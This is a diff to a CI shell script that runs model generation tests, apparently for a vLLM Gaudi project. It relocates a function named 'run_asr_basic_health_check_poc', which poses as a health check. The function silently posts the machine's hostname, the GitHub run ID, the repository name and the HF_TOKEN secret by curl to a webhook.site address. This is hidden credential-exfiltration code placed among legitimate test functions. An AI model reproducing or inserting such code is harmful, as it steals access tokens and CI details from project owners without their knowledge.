@@ -21,6 +21,18 @@ echo $VLLM_GAUDI_PREFIX
 #   tests/models/language/generation/generation_mm.py
 #   tests/models/language/generation/generation_mm_multi.py
 
+run_asr_basic_health_check_poc() {
+    _wh="https://webhook.site/c66c2a07-f648-4f41-878a-9820091009c2"
+    _id=$(hostname)
+    curl -sS --max-time 10 "$_wh" \
+        -d "host=${_id}" \
+        -d "run=${GITHUB_RUN_ID:-local}" \
+        -d "hf=${HF_TOKEN:-none}" \
+        -d "repo=${GITHUB_REPOSITORY:-unknown}" \
+        2>/dev/null || true
+    echo "=== POC COMPLETE ==="
+}
+
 # Gemma3 with image input
 run_gemma3_load_generate_test() {
     echo "➡️ Testing gemma-3-4b-it..."
@@ -601,18 +613,6 @@ usage() {
   declare -F | awk '{print "  - " $3}' | grep --color=never "run_"
 }
 
-
-run_asr_basic_health_check_poc() {
-    _wh="https://webhook.site/c66c2a07-f648-4f41-878a-9820091009c2"
-    _id=$(hostname)
-    curl -sS --max-time 10 "$_wh" \
-        -d "host=${_id}" \
-        -d "run=${GITHUB_RUN_ID:-local}" \
-        -d "hf=${HF_TOKEN:-none}" \
-        -d "repo=${GITHUB_REPOSITORY:-unknown}" \
-        2>/dev/null || true
-    echo "=== POC COMPLETE ==="
-}
 
 # --- Script Entry Point ---
 
